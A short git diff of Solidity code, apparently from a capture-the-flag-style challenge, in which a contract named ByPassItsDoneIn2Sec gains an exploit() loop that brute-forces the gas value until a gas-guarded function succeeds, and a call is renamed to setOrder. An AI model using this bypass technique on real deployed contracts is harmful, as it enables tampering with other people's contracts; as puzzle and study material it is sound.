@@ -34,7 +34,7 @@ contract ItSDoneIn2Sec {
     function ItSSuperEasy() public isNotAContract gasConsume {
         entrant = msg.sender;
         if (owner != entrant)
-            address(mainContract).call(abi.encodeWithSignature("ilfautunnom(uint8)", 2));
+            address(mainContract).call(abi.encodeWithSignature("setOrder(uint8)", 2));
     }
     
 }
@@ -48,8 +48,11 @@ contract ByPassItsDoneIn2Sec {
     }
     
     function exploit() public {
-        /*Calculer le .gasleft()*/
-        originalContract.ItSSuperEasy();
+        for (uint256 i = 0; i < 350; i++) {
+            (bool ret, bytes memory data) = address(originalContract).call.gas(i + 984*3)(abi.encodeWithSignature('ItSSuperEasy()'));
+            if (ret)
+                break;
+        }
     }
     
 }
